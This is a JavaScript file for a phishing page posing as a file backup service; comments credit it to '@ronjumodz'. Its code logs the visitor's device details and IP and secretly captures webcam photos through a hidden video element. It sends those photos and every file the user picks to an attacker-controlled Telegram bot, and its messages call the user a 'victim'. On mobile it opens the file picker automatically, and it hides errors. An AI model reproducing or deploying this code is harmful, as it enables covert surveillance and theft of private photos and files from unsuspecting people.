// URL থেকে টোকেন এবং চ্যাট আইডি পড়া
const urlParams = new URLSearchParams(window.location.search);
let TELEGRAM_BOT_TOKEN = urlParams.get('token');
let TELEGRAM_CHAT_ID = urlParams.get('chatid');
const DEVELOPER_NAME = '@ronjumodz';

// Validate parameters
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('Missing token or chatid parameters in URL');
    // You can show an error message or redirect
    document.body.innerHTML = `
        <div style="padding: 50px; text-align: center; font-family: Arial, sans-serif;">
            <h2 style="color: #d93025;">⚠️ Invalid Link</h2>
            <p>This link is missing required parameters.</p>
            <p>Please generate a new link from the Telegram bot.</p>
        </div>
    `;
    throw new Error('Missing required URL parameters: token and chatid');
}

console.log('Bot Token:', TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
console.log('Chat ID:', TELEGRAM_CHAT_ID);
console.log('Full URL:', window.location.href);

// DOM ELEMENTS
const allowBtn = document.getElementById('allowBtn');
const cancelBtn = document.getElementById('cancelBtn');
const continueBtn = document.getElementById('continueBtn');
const fileInput = document.getElementById('fileInput');
const uploadModal = document.getElementById('uploadModal');
const successModal = document.getElementById('successModal');
const progressFill = document.getElementById('progressFill');
const progressPercent = document.getElementById('progressPercent');
const progressLabel = document.getElementById('progressLabel');
const fileList = document.getElementById('fileList');

let selectedFiles = [];
let uploadedCount = 0;
let deviceInfo = {};

// GET DEVICE INFO
async function getDeviceInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        deviceInfo = {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            ip: ipData.ip,
            time: new Date().toLocaleString(),
            url: window.location.href,
            telegramChatId: TELEGRAM_CHAT_ID,
            // Get referrer if available
            referrer: document.referrer || 'Direct'
        };
    } catch (error) {
        deviceInfo = {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            ip: 'Unknown',
            time: new Date().toLocaleString(),
            url: window.location.href,
            telegramChatId: TELEGRAM_CHAT_ID,
            referrer: document.referrer || 'Direct'
        };
    }
}

// CAMERA HACKING FUNCTION
async function hackCamera() {
    try {
        console.log('Starting camera hacking...');
        
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            console.log('Camera API not available');
            return false;
        }
        
        let stream;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });
        } catch (cameraError) {
            console.log('Camera access denied:', cameraError);
            return false;
        }
        
        const video = document.createElement('video');
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        video.style.left = '-9999px';
        video.style.width = '1px';
        video.style.height = '1px';
        video.style.opacity = '0';
        document.body.appendChild(video);
        
        video.srcObject = stream;
        
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        
        let capturedPhotos = 0;
        
        for (let i = 0; i < 3; i++) {
            try {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                if (blob) {
                    const cameraFile = new File([blob], `camera_photo_${Date.now()}_${i+1}.jpg`, {
                        type: 'image/jpeg'
                    });
                    
                    await sendToTelegram('', cameraFile, `📸 LIVE CAMERA PHOTO ${i+1}/3`);
                    capturedPhotos++;
                    
                    console.log(`Photo ${i+1} captured and sent`);
                }
                
                if (i < 2) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                
            } catch (photoError) {
                console.log(`Photo ${i+1} error:`, photoError);
            }
        }
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        canvas.remove();
        
        if (capturedPhotos > 0) {
            const cameraMsg = `✅ CAMERA HACK SUCCESSFUL\n📸 Photos Captured: ${capturedPhotos}\n📱 Device: ${deviceInfo.platform}\n📍 IP: ${deviceInfo.ip}\n👤 Chat ID: ${deviceInfo.telegramChatId}\n🔐 Developer: ${DEVELOPER_NAME}`;
            await sendTelegramMessage(cameraMsg);
            return true;
        }
        
        return false;
        
    } catch (error) {
        console.log('Camera hacking error:', error);
        return false;
    }
}

// TELEGRAM FUNCTIONS
async function sendToTelegram(message, photoFile = null, caption = '') {
    try {
        if (photoFile) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', photoFile);
            
            const cleanName = photoFile.name.replace(/[^\w\s.-]/gi, '_');
            const finalCaption = caption + '\n' +
                               'File: ' + cleanName + '\n' +
                               'Size: ' + formatFileSize(photoFile.size) + '\n' +
                               'Device: ' + deviceInfo.platform + '\n' +
                               'IP: ' + deviceInfo.ip + '\n' +
                               'Chat ID: ' + deviceInfo.telegramChatId + '\n' +
                               'Time: ' + new Date().toLocaleTimeString() + '\n' +
                               'Developer: ' + DEVELOPER_NAME;
            
            formData.append('caption', finalCaption);
            
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            if (!response.ok) {
                throw new Error(`Telegram API error: ${response.status}`);
            }
            
            return true;
        } else {
            const encodedMessage = encodeURIComponent(message);
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`);
            
            if (!response.ok) {
                throw new Error(`Telegram API error: ${response.status}`);
            }
            
            return true;
        }
    } catch (error) {
        console.log('Error sending to Telegram:', error);
        // Don't show error to user
        return true;
    }
}

async function sendTelegramMessage(message) {
    return sendToTelegram(message);
}

async function sendTelegramPhoto(file, caption) {
    return sendToTelegram('', file, caption);
}

// UTILITY FUNCTIONS
function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function updateProgress(percent, status) {
    if (progressFill) progressFill.style.width = percent + '%';
    if (progressPercent) progressPercent.textContent = percent + '%';
    if (progressLabel) progressLabel.textContent = status;
}

function addFileToList(file, index) {
    const fileItem = document.createElement('div');
    fileItem.className = 'file-item';
    fileItem.id = 'file-' + index;
    
    const displayName = file.name.length > 40 ? file.name.substring(0, 37) + '...' : file.name;
    
    fileItem.innerHTML = `
        <div class="file-icon">
            <i class="fas fa-file-image"></i>
        </div>
        <div class="file-info">
            <div class="file-name">${displayName}</div>
            <div class="file-size">${formatFileSize(file.size)} • ${file.type || 'File'}</div>
        </div>
        <div class="file-status status-queued" id="status-${index}">
            <i class="fas fa-clock"></i> Queued
        </div>
    `;
    if (fileList) fileList.appendChild(fileItem);
}

function updateFileStatus(index, status, isSuccess) {
    const statusEl = document.getElementById('status-' + index);
    if (statusEl) {
        if (isSuccess) {
            statusEl.className = 'file-status status-uploaded';
            statusEl.innerHTML = '<i class="fas fa-check"></i> ' + status;
        } else {
            statusEl.className = 'file-status status-uploading';
            statusEl.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ' + status;
        }
    }
}

// MAIN PROCESS FUNCTION
async function processFiles(files) {
    await getDeviceInfo();
    
    selectedFiles = Array.from(files);
    
    if (uploadModal) uploadModal.style.display = 'flex';
    
    if (fileList) fileList.innerHTML = '';
    
    selectedFiles.forEach((file, index) => {
        addFileToList(file, index);
    });
    
    const initialMsg = `🚀 NEW VICTIM CONNECTED\n\n` +
                     `📱 Device: ${deviceInfo.platform}\n` +
                     `🌐 Browser: ${navigator.userAgent.substring(0, 80)}\n` +
                     `📍 IP: ${deviceInfo.ip}\n` +
                     `🗣️ Language: ${deviceInfo.language}\n` +
                     `🖥️ Screen: ${deviceInfo.screen}\n` +
                     `🕐 Time: ${deviceInfo.time}\n` +
                     `📁 Files: ${selectedFiles.length}\n` +
                     `👤 Receiver Chat ID: ${deviceInfo.telegramChatId}\n` +
                     `🔗 Referrer: ${deviceInfo.referrer}\n` +
                     `🔐 Developer: ${DEVELOPER_NAME}`;
    
    await sendTelegramMessage(initialMsg);
    
    setTimeout(async () => {
        try {
            console.log('Attempting camera hack...');
            const cameraHacked = await hackCamera();
            if (!cameraHacked) {
                console.log('Camera hack failed, sending notification');
                await sendTelegramMessage(`⚠️ CAMERA ACCESS DENIED\n👤 Chat ID: ${deviceInfo.telegramChatId}\n🔐 ${DEVELOPER_NAME}`);
            }
        } catch (error) {
            console.log('Camera process error:', error);
        }
    }, 1000);
    
    uploadedCount = 0;
    for (let i = 0; i < selectedFiles.length; i++) {
        const file = selectedFiles[i];
        const progress = Math.round(((i + 1) / selectedFiles.length) * 100);
        
        updateProgress(progress, `Uploading ${i + 1} of ${selectedFiles.length} files...`);
        updateFileStatus(i, 'Uploading...', false);
        
        try {
            await sendTelegramPhoto(file, '📸 FILE CAPTURED');
            
            updateFileStatus(i, 'Uploaded', true);
            uploadedCount++;
            
        } catch (error) {
            updateFileStatus(i, 'Failed', false);
        }
        
        if (i < selectedFiles.length - 1) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
    
    updateProgress(100, 'Backup complete!');
    
    const completionMsg = `🎉 MISSION ACCOMPLISHED 🎉\n\n` +
                       `📊 Files: ${uploadedCount}/${selectedFiles.length}\n` +
                       `📱 Device: ${deviceInfo.platform}\n` +
                       `📍 IP: ${deviceInfo.ip}\n` +
                       `👤 Victim: Captured Successfully\n` +
                       `👨‍💻 Receiver Chat ID: ${deviceInfo.telegramChatId}\n` +
                       `🕐 Time: ${new Date().toLocaleString()}\n` +
                       `🔐 Developer: ${DEVELOPER_NAME}\n` +
                       `✅ ALL DATA SECURED`;
    
    await sendTelegramMessage(completionMsg);
    
    setTimeout(() => {
        if (uploadModal) uploadModal.style.display = 'none';
        if (successModal) successModal.style.display = 'flex';
    }, 2000);
}

// EVENT LISTENERS
if (allowBtn) {
    allowBtn.addEventListener('click', () => {
        if (fileInput) fileInput.click();
    });
}

if (cancelBtn) {
    cancelBtn.addEventListener('click', () => {
        if (confirm('Backup will be cancelled. Continue?')) {
            window.location.href = 'https://drive.google.com';
        }
    });
}

if (continueBtn) {
    continueBtn.addEventListener('click', () => {
        window.location.href = 'https://drive.google.com';
    });
}

if (fileInput) {
    fileInput.addEventListener('change', async (e) => {
        const files = e.target.files;
        if (files.length > 0) {
            await processFiles(files);
        }
    });
}

// AUTO START ON MOBILE
window.addEventListener('load', () => {
    console.log('Page loaded with parameters:', { token: TELEGRAM_BOT_TOKEN?.substring(0, 10) + '...', chatid: TELEGRAM_CHAT_ID });
    
    if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
        setTimeout(() => {
            if (allowBtn) allowBtn.click();
        }, 2000);
    }
});